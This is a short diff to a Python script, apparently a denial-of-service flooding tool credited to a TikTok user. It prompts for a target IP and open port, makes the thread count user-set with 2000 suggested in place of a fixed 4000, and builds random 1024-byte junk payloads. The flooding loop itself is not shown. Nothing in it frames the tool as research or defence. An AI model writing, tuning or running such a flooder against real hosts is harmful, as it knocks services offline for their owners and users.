@@ -7,9 +7,9 @@ import os
 
 TARGET_IP = input("TARGET IP: ")
 TARGET_PORT = int(input("OPEN PORT: "))
+NUM_THREADS = int(input("THREADS (2000 SUGGESTED): "))
 os.system("clear")
 print("MADE BY apexvr_ ON TIKTOK")
-NUM_THREADS = 4000
 
 def random_payload(size=1024):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
